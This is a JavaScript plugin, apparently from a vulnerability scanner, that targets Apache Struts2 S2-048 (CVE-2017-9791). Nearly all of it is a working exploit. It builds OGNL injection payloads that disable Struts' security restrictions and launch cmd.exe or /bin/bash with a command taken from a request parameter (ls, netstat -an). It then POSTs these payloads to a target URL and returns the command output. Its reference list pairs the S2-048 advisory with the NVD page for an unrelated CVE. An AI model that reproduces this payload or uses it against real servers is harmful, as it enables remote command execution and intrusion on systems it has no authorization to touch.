
module.exports={
	tags: "struts2,048,cve-2017-9791,20179791,parms",
	des: "CVE-2017-9791,struts2 048Vulnerability detection",
	VulApps:[
		"https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-048",
		"http://oe58q5lw3.bkt.clouddn.com/s/struts2/struts2/s2-048-1.war"
	],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-048",
		"https://nvd.nist.gov/vuln/detail/CVE-2017-5638"
	],
	doCheck:function (url,fnCbk,parms)
	{
		//if(!parms)return fnCbk && fnCbk() || '';
		var _t = this,_s = _t.self;
		var szOldUrl = url;
		if('/' == url.substr(-1))url = url.substr(0,url.length - 1);
		
		// _s.g_szCmdW  = _s.g_szCmd = "ls";
		var payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." + 
			"(#_memberAccess?(#_memberAccess=#dm):" + 
			"((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." + 
			"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))" + 
			".(#ognlUtil.getExcludedPackageNames().clear())"+ 
		 	".(#ognlUtil.getExcludedClasses().clear())" + 
			".(#context.setMemberAccess(#dm))))" + 
			".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))" + 
			".(#cmds=(#iswin?{'cmd.exe','/c','" + _s.g_szCmdW + "'}:{'/bin/bash','-c','" + _s.g_szCmd + "'}))" + 
			".(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))" + 
			".(#process=#p.start())"
			+ ".(#response=@org.apache.struts2.ServletActionContext@getResponse())"
			// + ".(#response.addHeader('struts2','_struts2_'))"
			+".(#ros=#response.getOutputStream())" + 
			".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
		if(!parms)parms={"name":1};
	    

		var sP = "%{(#szgx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='netstat -an').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','" + _s.g_szCmdW + "'}:{'/bin/bash','-c','" + _s.g_szCmd + "'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())}";
		sP = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=#parameters.cmd[0]).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
	    for(var k in parms)
			parms[k] = sP;//payload;// _s.g_postData || 
		parms["cmd"]= "ls";
		_s.request(_s.fnOptHeader({method: 'POST',uri: url
			// +"?name=" + encodeURIComponent(sP)
			,
			"formData":parms,
			"headers":
	    	{
	    		// "Content-Type":encodeURIComponent(sP),
	    		Referer:url
	    	}}),
	    	function(e,r,b)
	    {
			// console.log(b)
	    	_s.error(e);
	    	_s.fnShowBody(b);
	    	// console.log(b); 
	    	b = _s.fnCheckVul1(b);
	    	_s.fnDoBody(b,"s2-048",szOldUrl,null,function(o)
	  			{
	  				var r = {"url":url,"send":payload};
	  				fnCbk(_s.copyO2O(r,o),_t);
	  			});
	    });
	}
};